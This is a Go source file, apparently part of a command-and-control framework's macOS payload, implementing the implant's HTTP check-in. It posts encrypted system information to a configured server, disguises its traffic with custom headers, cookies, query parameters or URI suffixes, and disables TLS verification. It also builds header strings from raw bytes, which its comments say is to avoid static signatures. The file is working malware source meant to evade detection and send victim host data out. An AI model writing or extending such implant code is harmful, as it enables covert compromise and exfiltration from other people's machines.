// server/docker/payloads/Darwin/http.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net/http"
	"time"
)

// HTTP strings (constructed to avoid static signatures)
var (
	httpHeaderUserAgent   = string([]byte{0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74})                                     // User-Agent
	httpHeaderContentType = string([]byte{0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65})                         // Content-Type
	httpMetaId            = string([]byte{0x69, 0x64})                                                                                     // id
	httpMetaEncryption    = string([]byte{0x65, 0x6e, 0x63, 0x72, 0x79, 0x70, 0x74, 0x69, 0x6f, 0x6e})                                     // encryption
	httpEncRsaAes         = string([]byte{0x72, 0x73, 0x61, 0x2b, 0x61, 0x65, 0x73})                                                       // rsa+aes

	// Padding length headers
	httpHeaderPadPre = string([]byte{0x58, 0x2d, 0x50, 0x61, 0x64, 0x2d, 0x50, 0x72, 0x65}) // X-Pad-Pre
	httpHeaderPadApp = string([]byte{0x58, 0x2d, 0x50, 0x61, 0x64, 0x2d, 0x41, 0x70, 0x70}) // X-Pad-App
)

// placeInLocation places data in the specified HTTP location
// output format: "body", "header:<name>", "cookie:<name>", "query:<name>", "uri_append"
// prependLen and appendLen are NOT set here - X-Pad headers are only for POST body data
// For non-body locations (header/cookie/query), the server uses transform.Length directly
func placeInLocation(req *http.Request, output string, data []byte, prependLen, appendLen int) {
	locType, name := parseOutput(output)

	// NOTE: We don't set X-Pad headers here. Those are only for POST body data.
	// For clientID and other non-body data, the server uses the transform's Length
	// field directly for reversal (which is already in the config).

	switch locType {
	case "body":
		// Body is handled separately by the caller
		return
	case "header":
		req.Header.Set(name, string(data))
	case "cookie":
		req.AddCookie(&http.Cookie{Name: name, Value: string(data)})
	case "query":
		q := req.URL.Query()
		q.Set(name, string(data))
		req.URL.RawQuery = q.Encode()
	case "uri_append":
		req.URL.Path = req.URL.Path + string(data)
	}
}

// buildRequestWithTransforms creates an HTTP request with transformed clientID placed correctly
// Returns the request and body data (if output is "body")
func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataBlock, clientIDVal string, decrypted map[string]string) (*http.Request, []byte, error) {
	req, err := http.NewRequest(method, baseURL, nil)
	if err != nil {
		return nil, nil, fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	var bodyData []byte

	if clientIDDataBlock != nil && len(clientIDDataBlock.Transforms) > 0 {
		// Apply transforms to clientID
		transformed, err := applyTransforms([]byte(clientIDVal), clientIDDataBlock.Transforms)
		if err != nil {
			return nil, nil, fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		locType, _ := parseOutput(clientIDDataBlock.Output)
		if locType == "body" {
			bodyData = transformed.Data
			// Still set padding headers
			if transformed.PrependLength > 0 {
				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", transformed.PrependLength))
			}
			if transformed.AppendLength > 0 {
				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", transformed.AppendLength))
			}
		} else {
			placeInLocation(req, clientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
		}
	} else {
		// Legacy: use query param with clientID name/format from decrypted values
		clientIDName := decrypted[geKeyGetClientIDName]
		if clientIDName != "" {
			q := req.URL.Query()
			q.Set(clientIDName, clientIDVal)
			req.URL.RawQuery = q.Encode()
		}
	}

	return req, bodyData, nil
}

// PostData represents the structure of our post request body
type PostData struct {
	Data      string            `json:"data"`      // Our encrypted system info
	Metadata  map[string]string `json:"metadata"`  // Additional metadata
	Timestamp int64             `json:"timestamp"` // Current timestamp
}

type SignedResponse struct {
	Status             string `json:"status"`
	NewClientID        string `json:"new_client_id"`
	SecretsInitialized bool   `json:"secrets_initialized"`
	Signature          string `json:"signature"`
	Seed               string `json:"seed"`
}

// parseCustomHeaders converts the JSON string of custom headers into a map
func parseCustomHeaders(headerJSON string) (map[string]string, error) {
	headers := make(map[string]string)
	err := json.Unmarshal([]byte(headerJSON), &headers)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}
	return headers, nil
}

func sendInitialPost(url string, encryptedData string, decrypted map[string]string) (string, error) {
	method := decrypted[geKeyPostMethod]
	if method == "" {
		method = geMethodPost
	}

	postData := PostData{
		Data: encryptedData,
		Metadata: map[string]string{
			httpMetaId:         clientID,
			httpMetaEncryption: httpEncRsaAes,
		},
		Timestamp: time.Now().Unix(),
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	req, err := http.NewRequest(method, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	customHeaders, err := parseCustomHeaders(decrypted[geKeyCustomHeaders])
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	req.Header.Set(httpHeaderUserAgent, decrypted[geKeyUserAgent])
	req.Header.Set(httpHeaderContentType, decrypted[geKeyContentType])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr, Timeout: time.Second * 30}

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	var signedResponse SignedResponse
	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Parse server's public key
	block, _ := pem.Decode([]byte(decrypted[geKeyPublicKey]))
	if block == nil {
		return "", fmt.Errorf(Err(E18))
	}

	publicKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	signature, err := base64.StdEncoding.DecodeString(signedResponse.Signature)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	if err := rsa.VerifyPKCS1v15(publicKey, crypto.SHA256, hashed[:], signature); err != nil {
		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	if signedResponse.NewClientID == "" {
		return "", fmt.Errorf(Err(E18))
	}

	return signedResponse.NewClientID, nil
}
